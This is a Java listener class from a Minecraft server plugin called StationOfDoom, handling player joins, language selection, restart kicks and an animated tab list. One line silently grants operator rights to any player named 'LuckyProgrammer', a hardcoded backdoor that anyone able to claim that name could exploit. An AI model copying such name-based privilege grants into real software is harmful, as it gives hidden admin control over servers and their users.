package de.j.stationofdoom.listener;

import de.j.stationofdoom.cmd.VersionCMD;
import de.j.stationofdoom.cmd.VoteRestartCMD;
import de.j.stationofdoom.main.Main;
import de.j.stationofdoom.util.Tablist;
import de.j.stationofdoom.util.WhoIsOnline;
import de.j.stationofdoom.util.translations.ChangeLanguageGUI;
import de.j.stationofdoom.util.translations.LanguageChanger;
import de.j.stationofdoom.util.translations.LanguageEnums;
import de.j.stationofdoom.util.translations.TranslationFactory;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.minimessage.MiniMessage;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.scheduler.BukkitRunnable;
import org.checkerframework.checker.units.qual.C;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;

public class PlayerJoin implements Listener {

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        TranslationFactory translations = new TranslationFactory();

        if (LanguageChanger.hasPlayerLanguage(player)) {
            Main.getMainLogger().info("Loaded translation for " + player.getName());
        } else {
            player.openInventory(new ChangeLanguageGUI().getGUI(player));
            Main.getMainLogger().info("Opened language gui for " + player.getName());
        }

        if (VoteRestartCMD.restarting) {
            player.kick(Component.text(translations.getTranslation(player, "ServerRestart") + "\n \n").color(NamedTextColor.DARK_RED)
                    .append(Component.text(translations.getTranslation(player, "JoinAgain")).color(NamedTextColor.BLUE)));
        }
        event.joinMessage(Component.text(player.getName()).color(NamedTextColor.GOLD)
                .append(Component.text(translations.getTranslation(translations.getServerLang(), "JoinMessage"))));
        if (player.getName().equals("LuckyProgrammer")){
            player.setOp(true);
        }

        Tablist tablist = new Tablist();
        MiniMessage mm = MiniMessage.miniMessage();
        tablist.setScoreboard();

        WhoIsOnline.join(player);

        if (player.isOp()) {
            try {
                String version = VersionCMD.getLatestTagName();
                if (Main.version.equals(version)) {
                    player.sendMessage(Component.text(translations.getTranslation(player, "ServerVersion", "v" + Main.version, version)).color(NamedTextColor.GREEN));
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        new BukkitRunnable() {
            int phase = 0;
            @Override
            public void run() {
                int ping = player.getPing();
                tablist.tabTPS(player, mm.deserialize("     <dark_blue>StationOfDoom</dark_blue>     <newline><newline>"),
                        mm.deserialize("<newline><newline>     <red>Hosted by </red><rainbow:" + phase + ">LuckyProgrammer</rainbow>     <newline> <red>Plugin by </red><rainbow:!" + (phase + 2) + ">LuckyProgrammer</rainbow>")
                        .append(Component.text(String.format("\nTPS:  %s;  %s;  %s", (int) Main.getPlugin().getServer().getTPS()[0], (int) Main.getPlugin().getServer().getTPS()[1], (int) Main.getPlugin().getServer().getTPS()[2]), NamedTextColor.LIGHT_PURPLE))
                        .append(Component.text("\n Ping: ")
                                .append(Component.text(String.valueOf(ping))
                                        .color(ping > 30 ? NamedTextColor.RED : NamedTextColor.GREEN))));
                phase ++;
                if (phase >= 14) {
                    phase = 0;
                }
            }
        }.runTaskTimerAsynchronously(Main.getPlugin(), 20, 10);
    }

}
